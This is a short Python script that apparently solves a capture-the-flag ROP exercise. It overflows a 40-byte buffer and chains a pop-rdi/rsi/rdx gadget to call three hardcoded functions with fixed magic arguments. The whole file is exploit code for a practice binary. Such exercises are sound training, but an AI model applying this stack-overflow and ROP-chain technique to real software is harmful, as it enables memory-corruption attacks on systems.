import struct

def p64(addr):
    return struct.pack("<Q", addr)

call_one = 0x0000000000400720
call_two = 0x0000000000400740
call_three = 0x00000000004006f0

arg_one = 0xdeadbeefdeadbeef
arg_two = 0xcafebabecafebabe
arg_three = 0xd00df00dd00df00d

# segfault at 42 - 2
offset = 40

# pop rdi; pop rsi; pop rdx; ret;
gadget = 0x000000000040093c

payload = "\x90" * offset + p64(gadget) + p64(arg_one) + p64(arg_two) + p64(arg_three) + p64(call_one) + p64(gadget) + p64(arg_one) + p64(arg_two) + p64(arg_three) + p64(call_two) + p64(gadget) + p64(arg_one) + p64(arg_two) + p64(arg_three) + p64(call_three)
print payload
